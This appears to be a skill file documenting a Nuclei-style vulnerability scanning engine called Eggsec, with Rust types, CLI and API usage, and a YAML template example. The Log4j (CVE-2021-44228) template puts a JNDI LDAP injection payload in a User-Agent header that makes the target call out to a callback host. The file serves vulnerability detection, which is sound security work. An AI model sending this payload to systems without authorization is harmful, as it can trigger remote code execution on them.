---
name: template_based_scanning
description: "Nuclei-style template-based vulnerability scanning engine"
triggers:
  - nuclei template
  - template scan
  - nuclei-style
  - vulnerability template
  - template matcher
  - nuclei
  - template engine
metadata:
  category: scanner
  tools: [scanner, templates]
  scope: targets
---

## Overview

Eggsec provides a Nuclei-style template-based vulnerability scanning engine through the `scanner/templates` module. This allows execution of YAML-defined vulnerability templates against targets, inspired by Project Discovery's nuclei tool.

## Capabilities

- **Template Engine**: Execute vulnerability templates against targets
- **Template Loader**: Load and validate templates from YAML/JSON files
- **Matcher System**: Match template conditions against HTTP responses
- **Marketplace**: Template marketplace for community templates
- **Built-in Templates**: Pre-loaded template collection

## Key Types

```rust
// Template engine
pub struct TemplateEngine {
    executor: TemplateExecutor,
}

pub struct TemplateExecutionResult {
    pub template_name: String,
    pub template_id: String,
    pub matched: bool,
    pub severity: Option<Severity>,
    pub extracted_data: HashMap<String, String>,
}

// Template loader
pub struct TemplateLoader {
    dirs: Vec<PathBuf>,
}

pub struct VulnerabilityTemplate {
    pub id: String,
    pub info: TemplateInfo,
    pub matchers: Vec<Matcher>,
    pub requests: Vec<HttpRequest>,
}
```

## Template Format

```yaml
id: CVE-2021-44228
info:
  name: Log4j Remote Code Execution
  author: eggsec
  severity: critical
  tags:
    - cve
    - rce
matchers:
  - type: http
    path: "/"
    search:
      - pattern: "vulnerable"
        mode: word
requests:
  - method: GET
    path: "/"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
```

## Usage

### CLI Usage

```bash
# Run template scan
eggsec template scan --template templates/cves.yaml --target https://example.com

# With marketplace
eggsec template marketplace list
eggsec template install CVE-2021-44228

# Run multiple templates
eggsec template scan --templates-dir ./templates --target https://example.com
```

### API Usage

```rust
use eggsec::scanner::templates::{TemplateEngine, TemplateLoader};
use std::path::PathBuf;

let loader = TemplateLoader::new(vec![PathBuf::from("templates/")]);
let engine = TemplateEngine::new(executor);

let results = engine.scan("https://example.com").await?;
for result in results {
    if result.matched {
        println!("Found: {} ({})", result.template_name, result.template_id);
    }
}
```

## Matcher Types

- **http**: Match against HTTP response
- **word**: Simple word matching
- **regex**: Regular expression matching
- **dsl**: DSL-based complex conditions
- **status**: HTTP status code matching
- **binary**: Binary data matching

## Triggers

Keywords that activate this skill: `nuclei template`, `template scan`, `nuclei-style`, `vulnerability template`, `template matcher`, `nuclei`
